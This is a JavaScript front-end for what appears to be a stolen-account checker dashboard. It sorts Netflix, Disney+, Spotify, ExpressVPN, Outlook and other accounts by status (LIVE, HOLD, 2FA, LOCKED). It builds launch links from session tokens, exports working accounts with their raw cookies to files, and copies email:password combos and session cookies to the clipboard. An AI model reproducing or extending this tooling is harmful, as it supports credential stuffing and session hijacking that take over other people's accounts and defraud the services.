          ${browserUrl ? `<a href="${browserUrl}" target="_blank" class="btn-outline-sm" style="color:#38bdf8; text-decoration:none; padding:2px 6px; font-size:11px;">Browser</a>` : ''}
          ${androidUrl ? `<a href="${androidUrl}" target="_blank" class="btn-outline-sm" style="color:#4ade80; text-decoration:none; padding:2px 6px; font-size:11px;">Android</a>` : ''}
          ${tvUrl ? `<a href="${tvUrl}" target="_blank" class="btn-outline-sm" style="color:#a855f7; text-decoration:none; padding:2px 6px; font-size:11px;">TV</a>` : ''}
          ${item.raw ? `<button class="btn-outline-sm" style="color:#f1f5f9; padding:2px 6px; font-size:11px;" onclick="copyBulkCookie(${item.index})">Cookie</button>` : ''}
        </div>
      ` : '-'}
    </td>
    <td style="color:var(--text-muted)">${item.route || 'Direct'}</td>
  `;
  return tr;
}

function appendBulkRow(item) {
  const isHold = (item.status === 'HOLD' || item.is_hold);
  const isLive = (item.status === 'LIVE' || (item.live && !isHold));
  let visible = true;
  if (bulkFilter === 'LIVE') visible = isLive;
  else if (bulkFilter === 'HOLD') visible = isHold;
  else if (bulkFilter === 'DEAD') visible = (!isLive && !isHold);
  else if (bulkFilter === '4K') visible = isLive && (item.plan && (item.plan.includes('4K') || item.plan.includes('ULTRA')));
  
  if (visible) {
    const tbody = document.getElementById('bulk-tbody');
    const tr = createBulkRowElement(item);
    tbody.prepend(tr);
  }
}

function exportBulk(type, targetStatus = 'LIVE') {
  let list = [];
  if (targetStatus === 'HOLD') {
    list = bulkResults.filter(r => r.status === 'HOLD' || r.is_hold);
  } else {
    list = bulkResults.filter(r => r.status === 'LIVE' || (r.live && r.status !== 'HOLD' && !r.is_hold));
  }

  if (list.length === 0) {
    showToast(`Belum ada akun ${targetStatus} untuk diexport`);
    return;
  }

  let blob, filename;
  const prefix = targetStatus.toLowerCase();
  if (type === 'txt') {
    const lines = list.map((r, i) => {
      const tok = r.token_data || {};
      const launch = buildLaunchLinks(tok.token || tok.url || tok.browser_url);
      let block = `[${i+1}] [${r.status || targetStatus}] Plan: ${r.plan || '-'} | Billing: ${r.billing || '-'} | Country: ${r.country || '-'}\n`;
      if (r.email && r.email !== 'Account Valid') block += `Email  : ${r.email}\n`;
      if (r.profiles && r.profiles.length) block += `Profile: ${r.profiles.join(', ')}\n`;
      if (launch.browser) block += `Browser: ${launch.browser}\n`;
      if (launch.android) block += `Android: ${launch.android}\n`;
      if (launch.tv)      block += `SmartTV: ${launch.tv}\n`;
      block += `Cookie : ${r.raw}\n----------------------------------`;
      return block;
    });
    blob = new Blob([lines.join('\n')], {type: 'text/plain;charset=utf-8'});
    filename = `netflix_${prefix}_${Date.now()}.txt`;
  } else {
    const enriched = list.map(r => {
      const tok = r.token_data || {};
      const launch = buildLaunchLinks(tok.token || tok.url || tok.browser_url);
      return {
        ...r,
        launch_links: launch
      };
    });
    blob = new Blob([JSON.stringify(enriched, null, 2)], {type: 'application/json;charset=utf-8'});
    filename = `netflix_${prefix}_${Date.now()}.json`;
  }
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
  showToast(`File ${filename} didownload`);
}

// History DB Pagination & Search
function onSearchInput() {
  clearTimeout(searchDebounce);
  searchDebounce = setTimeout(() => {
    resetPageAndLoad();
  }, 350);
}

function resetPageAndLoad() {
  curPage = 1;
  loadHistory();
}

function prevPage() {
  if (curPage > 1) {
    curPage--;
    loadHistory();
  }
}

function nextPage() {
  curPage++;
  loadHistory();
}

async function loadHistory() {
  const tbody = document.getElementById('history-tbody');
  tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color:var(--text-muted); padding:20px;">Memuat data riwayat...</td></tr>';

  const q = document.getElementById('hist-search').value.trim();
  const st = document.getElementById('hist-filter-status').value;
  const pl = document.getElementById('hist-filter-plan').value;
  const tp = document.getElementById('hist-filter-type').value;
  const offset = (curPage - 1) * pageSize;

  try {
    const params = new URLSearchParams({
      limit: pageSize,
      offset: offset,
      search: q,
      status: st,
      plan: pl,
      type: tp
    });
    const res = await fetch(`/api/history?${params.toString()}`, {
      headers: getAuthHeaders()
    });
    const data = await res.json();
    renderHistoryTable(data);
  } catch(e) {
    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color:var(--dead); padding:20px;">Gagal memuat riwayat.</td></tr>';
  }
}

function renderHistoryTable(data) {
  const tbody = document.getElementById('history-tbody');
  const rows = data.items || [];
  const total = data.total || 0;
  window.currentHistoryRows = rows;

  if (rows.length === 0) {
    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color:var(--text-muted); padding:20px;">Tidak ada data riwayat.</td></tr>';
    document.getElementById('pag-start').innerText = '0';
    document.getElementById('pag-end').innerText = '0';
    document.getElementById('pag-total').innerText = total;
    document.getElementById('btn-prev').disabled = true;
    document.getElementById('btn-next').disabled = true;
    return;
  }

  tbody.innerHTML = rows.map(r => {
    const svcBadge = r.type === 'disney' ? '<span style="color:#1ce783;">🟢 Disney+</span>'
      : r.type === 'crunchyroll' ? '<span style="color:#f47521;">🟠 Crunchyroll</span>'
      : r.type === 'expressvpn' ? '<span style="color:#44b556;">🟢 ExpressVPN</span>'
      : r.type === 'spotify' ? '<span style="color:#1DB954;">🟢 Spotify</span>'
      : r.type === 'outlook' ? '<span style="color:#0078d4;">🔵 Outlook</span>'
      : r.type === 'hotmail' ? '<span style="color:#0078d4;">🔵 Hotmail</span>'
      : '<span style="color:#e50914;">🔴 Netflix</span>';
    const statusTag = r.status === 'LIVE' ? '<span class="tag-live">● LIVE</span>'
      : r.status === 'HOLD' ? '<span class="tag-hold">⏸ HOLD</span>'
      : r.status === 'FREE' ? '<span style="color:#38bdf8; background:rgba(56,189,248,0.1); padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700;">🆓 FREE</span>'
      : r.status === 'PREMIUM' ? '<span style="color:#fbbf24; background:rgba(251,191,36,0.1); padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700;">👑 PREMIUM</span>'
      : r.status === 'TRIAL' ? '<span style="color:#a78bfa; background:rgba(167,139,250,0.1); padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700;">🧪 TRIAL</span>'
      : r.status === 'BAD' ? '<span class="tag-dead">✕ BAD</span>'
      : r.status === 'DEAD' ? '<span class="tag-dead">✕ DEAD</span>'
      : r.status === '2FA' ? '<span style="color:#38bdf8; background:rgba(56,189,248,0.1); padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700;">🔐 2FA</span>'
      : r.status === 'LOCKED' ? '<span style="color:#f59e0b; background:rgba(245,158,11,0.1); padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700;">🔒 LOCKED</span>'
      : r.status === 'PHONE_LOCKED' ? '<span style="color:#ef4444; background:rgba(239,68,68,0.1); padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700;">📱 PHONE LOCKED</span>'
      : `<span class="tag-dead">⚠ ${r.status}</span>`;
    let identifier = r.email || '-';
    if (!r.email && r.raw_cookie) {
      if (r.type === 'spotify') {
        // Extract sp_dc value from Netscape cookie or raw string
        const spMatch = r.raw_cookie.match(/sp_dc\t([^\t\n]+)/);
        if (spMatch) {
          identifier = 'sp_dc:' + spMatch[1].substring(0, 20) + '…';
        } else {
          identifier = r.raw_cookie.substring(0, 30) + '…';
        }
      } else if (r.type === 'checker') {
        // Netflix cookie — show first 30 chars
        identifier = r.raw_cookie.substring(0, 30) + (r.raw_cookie.length > 30 ? '…' : '');
      } else {
        // Disney/CR/EVPN combos — show email part
        identifier = r.raw_cookie.split(':')[0];
      }
    }
    // Truncate any long identifier
    if (identifier.length > 40) identifier = identifier.substring(0, 38) + '…';
    const copyLabel = (r.type === 'checker' || r.type === 'spotify') ? 'Salin Cookie' : 'Salin Combo';
    return `
    <tr>
      <td style="color:var(--text-muted); font-family:'JetBrains Mono', monospace; font-size:11px;">${r.created_at}</td>
      <td style="font-weight:600; font-size:12px;">${svcBadge}</td>
      <td>${statusTag}</td>
      <td style="font-size:12px; color:var(--text-muted); max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${(r.email || '').replace(/"/g, '&quot;')}">${identifier}</td>
      <td style="${r.plan && r.plan.includes('4K') ? 'color:var(--accent-4k); font-weight:700;' : ''}">${r.plan || '-'}</td>
      <td style="font-size:12px; color:var(--text-muted);">${r.billing || '-'}</td>
      <td>${r.country || '-'}</td>
      <td>
        <div style="display:flex; gap:6px; align-items:center;">
          ${r.raw_cookie ? `<button class="copy-btn-sm" onclick="copyHistoryCookie(${r.id})">${copyLabel}</button>` : '-'}
        </div>
      </td>
    </tr>
  `;
  }).join('');

  const start = (curPage - 1) * pageSize + 1;
  const end = Math.min(curPage * pageSize, total);
  document.getElementById('pag-start').innerText = start;
  document.getElementById('pag-end').innerText = end;
  document.getElementById('pag-total').innerText = total;
  document.getElementById('page-num').innerText = `Halaman ${curPage}`;

  document.getElementById('btn-prev').disabled = (curPage <= 1);
  document.getElementById('btn-next').disabled = (end >= total);
}

function escapeAttr(str) {
  return (str || '').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, ' ');
}

async function exportCsvWithAuth() {
  try {
    const q = document.getElementById('hist-search').value.trim();
    const st = document.getElementById('hist-filter-status').value;
    const pl = document.getElementById('hist-filter-plan').value;
    const params = new URLSearchParams({ search: q, status: st, plan: pl });

    const res = await fetch(`/api/history/export_csv?${params.toString()}`, {
      headers: getAuthHeaders()
    });
    if (!res.ok) throw new Error('Gagal mengunduh CSV');
    const blob = await res.blob();
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `suite_history_${Date.now()}.csv`;
    a.click();
    showToast('File CSV berhasil diunduh (sesuai filter)');
  } catch(e) {
    showToast('Gagal export CSV: ' + e.message);
  }
}

async function clearDbHistory(onlyDead = false) {
  const msg = onlyDead ? 'Hapus semua entri DEAD / ERROR di database?' : 'Hapus SELURUH riwayat di database?';
  if (!confirm(msg)) return;
  await fetch('/api/history/clear', {
    method: 'POST',
    headers: getAuthHeaders({'Content-Type': 'application/json'}),
    body: JSON.stringify({ only_dead: onlyDead })
  });
  showToast(onlyDead ? 'Riwayat DEAD berhasil dibersihkan' : 'Seluruh database dibersihkan');
  curPage = 1;
  loadHistory();
}

// Analytics Charts
async function loadAnalytics() {
  const res = await fetch('/api/analytics', {
    headers: getAuthHeaders()
  });
  const d = await res.json();

  if (chartStatusObj) chartStatusObj.destroy();
  if (chartCountryObj) chartCountryObj.destroy();
  if (chartPlanObj) chartPlanObj.destroy();

  const ctxStatus = document.getElementById('chart-status').getContext('2d');
  chartStatusObj = new Chart(ctxStatus, {
    type: 'doughnut',
    data: {
      labels: ['LIVE', 'HOLD', 'DEAD'],
      datasets: [{
        data: [d.status_counts.LIVE || 0, d.status_counts.HOLD || 0, d.status_counts.DEAD || 0],
        backgroundColor: ['#10b981', '#f59e0b', '#f43f5e'],
        borderWidth: 0
      }]
    },
    options: {
      responsive: true,
      plugins: {
        legend: {
          labels: { color: '#848b9f', font: { family: 'Plus Jakarta Sans', weight: 600 } }
        }
      }
    }
  });

  const planLabels = Object.keys(d.plan_counts || {});
  const planData = Object.values(d.plan_counts || {});
  const ctxPlan = document.getElementById('chart-plan').getContext('2d');
  chartPlanObj = new Chart(ctxPlan, {
    type: 'doughnut',
    data: {
      labels: planLabels.length ? planLabels : ['Belum ada data'],
      datasets: [{
        data: planData.length ? planData : [0],
        backgroundColor: ['#a855f7', '#38bdf8', '#f59e0b', '#ec4899', '#10b981', '#64748b'],
        borderWidth: 0
      }]
    },
    options: {
      responsive: true,
      plugins: {
        legend: {
          labels: { color: '#848b9f', font: { family: 'Plus Jakarta Sans', weight: 600 } }
        }
      }
    }
  });

  const countryLabels = Object.keys(d.country_counts);
  const countryData = Object.values(d.country_counts);

  const ctxCountry = document.getElementById('chart-country').getContext('2d');
  chartCountryObj = new Chart(ctxCountry, {
    type: 'bar',
    data: {
      labels: countryLabels.length ? countryLabels : ['Belum ada data'],
      datasets: [{
        label: 'Jumlah Akun',
        data: countryData.length ? countryData : [0],
        backgroundColor: '#e50914',
        borderRadius: 6
      }]
    },
    options: {
      responsive: true,
      plugins: { legend: { display: false } },
      scales: {
        x: { ticks: { color: '#848b9f', font: { family: 'Plus Jakarta Sans' } }, grid: { display: false } },
        y: { ticks: { color: '#848b9f', font: { family: 'JetBrains Mono' } }, grid: { color: '#222634' } }
      }
    }
  });
}

function copyText(str, msg = 'Teks disalin ke clipboard') {
  if (!str) {
    showToast('Tidak ada teks untuk disalin');
    return;
  }

  // 1. Coba Clipboard API modern jika Secure Context (HTTPS / localhost)
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(str).then(() => {
      showToast(msg);
    }).catch(() => {
      fallbackCopyText(str, msg);
    });
    return;
  }

  // 2. Fallback untuk HTTP / LAN IP (misal http://192.168.x.x) / mobile browser
  fallbackCopyText(str, msg);
}

function fallbackCopyText(str, msg) {
  let success = false;
  try {
    const ta = document.createElement('textarea');
    ta.value = str;
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    ta.style.top = '-9999px';
    ta.style.opacity = '0';
    ta.setAttribute('readonly', '');
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, ta.value.length);
    success = document.execCommand('copy');
    document.body.removeChild(ta);
  } catch(e) {
    success = false;
  }

  if (success) {
    showToast(msg);
  } else {
    window.prompt('Salin manual dengan Ctrl+C / Cmd+C:', str);
  }
}

function copyJson(obj, msg = 'Cookie JSON disalin') {
  if (!obj) {
    showToast('Data JSON tidak tersedia');
    return;
  }
  const jsonStr = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 2);
  copyText(jsonStr, msg);
}

function copyHistoryCookie(id) {
  const item = (window.currentHistoryRows || []).find(x => x.id === id);
  if (item && item.raw_cookie) {
    copyText(item.raw_cookie, 'Cookie disalin ke clipboard');
  } else {
    showToast('Cookie tidak tersedia');
  }
}

function copyBulkCookie(idx) {
  const item = (bulkResults || []).find(x => x.index === idx);
  if (item && item.raw) {
    copyText(item.raw, 'Cookie disalin ke clipboard');
  } else {
    showToast('Cookie tidak tersedia');
  }
}

function copySingleCookieJson() {
  if (window.currentSingleCheckResult && window.currentSingleCheckResult.cookies) {
    copyJson(window.currentSingleCheckResult.cookies, 'Cookie JSON disalin');
  } else {
    showToast('Data cookie JSON tidak tersedia');
  }
}

function copySingleRawCookie() {
  const cookie = window.currentSingleCookieRaw || document.getElementById('single-cookie')?.value?.trim();
  if (cookie) {
    copyText(cookie, 'Cookie asli disalin');
  } else {
    showToast('Cookie tidak tersedia');
  }
}

